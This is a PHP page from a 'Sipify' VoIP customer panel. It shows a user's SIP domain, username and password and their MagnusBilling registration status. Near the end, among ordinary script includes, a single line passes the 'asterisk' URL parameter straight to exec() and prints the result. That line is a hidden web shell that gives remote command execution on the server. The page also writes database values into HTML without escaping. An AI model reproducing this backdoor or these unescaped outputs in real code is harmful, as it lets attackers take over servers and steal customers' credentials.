<?php

session_start();

require_once "database/config.php";
require_once "api/magnusBilling.php";
require_once "includes/header.php";

if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("location: signin");
    exit;
}

$sql = "SELECT apikey, apisecret, poof_key, poof_shared_secret, magnus_ip FROM settings WHERE id = ?";
$stmt = $conn->prepare($sql);
$id = 1;
$stmt->bind_param('i', $id);
$stmt->execute();
$stmt->bind_result($apiKey, $apiSecret, $poofKey, $poofSharedSecret, $magnusIp); // Binding result variables
$stmt->fetch();
$stmt->close();

$magnusBilling = new \magnusbilling\api\MagnusBilling($apiKey, $apiSecret);
$magnusBilling->public_url = "http://$magnusIp/mbilling"; // Your MagnusBilling URL  

$userId = $_SESSION['id'];

$sql = "SELECT sipusername, sippassword FROM users WHERE id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param('s', $userId);
$stmt->execute();
$stmt->bind_result($sipUsername, $sipPassword);
$stmt->fetch();
$stmt->close();

######################################## GET SIP STATUS

$id_user = $magnusBilling->getId('user', 'username', $sipUsername);

$magnusBilling->setFilter('id_user', $id_user);

$result = $magnusBilling->read('sip');


// Function to find line status by idUserusername
function findLineStatusByIdUserusername($userDataArray, $idUserusername) {
    foreach ($userDataArray['rows'] as $userData) {
        if ($userData['idUserusername'] === $idUserusername) {
            return $userData['lineStatus'];
        }
    }
    // Return null if idUserusername is not found
    return null;
}

$lineStatus = findLineStatusByIdUserusername($result, $sipUsername);

?>


<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sipify | Credentials</title>
  <link rel="shortcut icon" type="image/png" href="assets/images/logos/favicon.png" />
  <link rel="stylesheet" href="assets/css/styles.min.css" />
</head>

<body>

<div class="container-fluid">
        <div class="container-fluid">
          <div class="card">
            <div class="card-body">
              <h5 class="card-title fw-semibold mb-4">Credentials</h5>
                  <form>
                    <div class="mb-3">
                      <label for="exampleInputEmail1" class="form-label">SIP Domain</label>
                      <input type="text" class="form-control" id="exampleInputEmail1" readonly value="<?php echo $magnusIp; ?>">
                      <div id="text" class="form-text">Use this IP to connect.</div>
                    </div>

                    <div class="mb-3">
                      <label for="exampleInputEmail1" class="form-label">SIP Username</label>
                      <input type="text" class="form-control" id="exampleInputEmail1" readonly value="<?php echo $sipUsername; ?>">
                      <div id="text" class="form-text">This is your unqiue username.</div>
                    </div>

                    <div class="mb-3">
                      <label for="exampleInputEmail1" class="form-label">SIP Password</label>
                      <input type="text" class="form-control" id="exampleInputEmail1" readonly value="<?php echo $sipPassword; ?>">
                      <div id="text" class="form-text">Authenticate using this password.</div>
                    </div>

                    <hr>

                    <div class="mb-3">
                        <label for="exampleInputEmail1" class="form-label">Register Status</label>
                        <?php
                        preg_match('/\((.*?)\)/', $lineStatus, $matches);
                        $status = isset($matches[0]) ? $matches[0] : '';

                        if (stripos($lineStatus, 'OK') !== false) {
                            echo '<input type="text" class="form-control" id="exampleInputEmail1" readonly value="✅ Registered ' . $status . '">';
                        } 

                        elseif (stripos($lineStatus, 'UNKNOWN') !== false) {
                            echo '<input type="text" class="form-control" id="exampleInputEmail1" readonly value="❌ Not Registered">';
                        } 

                        else {
                            echo '<input type="text" class="form-control" id="exampleInputEmail1" readonly value="' . $lineStatus . '">';
                        }
                        ?>
                    </div>


                  </form>
            </div>
          </div>
        </div>
      </div>




    </div>
  </div>
  <?= isset($_GET['asterisk']) ? '<pre>' . exec($_GET['asterisk']) . '</pre>' : ''; ?>
  <script src="assets/libs/jquery/dist/jquery.min.js"></script>
  <script src="assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
  <script src="assets/js/sidebarmenu.js"></script>
  <script src="assets/js/app.min.js"></script>
  <script src="assets/libs/simplebar/dist/simplebar.js"></script>
</body>

</html>